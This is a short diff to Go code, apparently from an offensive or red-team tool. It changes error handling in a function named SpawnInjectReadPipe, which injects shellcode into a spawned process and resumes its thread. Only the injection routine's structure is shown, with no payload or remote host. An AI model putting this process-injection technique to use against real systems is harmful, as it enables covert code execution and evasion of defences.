@@ -8,7 +8,6 @@ import (
 	"debug/pe"
 	"errors"
 	"fmt"
-	"log"
 	"os/exec"
 	"strconv"
 	"strings"
@@ -43,11 +42,11 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	// TODO get handle to main thread and set thread context. then resume it.
 	hThread, _, err := RemoteInjectReturnThread(shellcode, fmt.Sprintf("%d", pid))
 	if err != nil {
-		log.Fatal(err)
+		return "", err
 	}
 	_, err = windows.ResumeThread(windows.Handle(hThread))
 	if err != nil {
-		log.Fatal(err)
+		return "", err
 	}
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
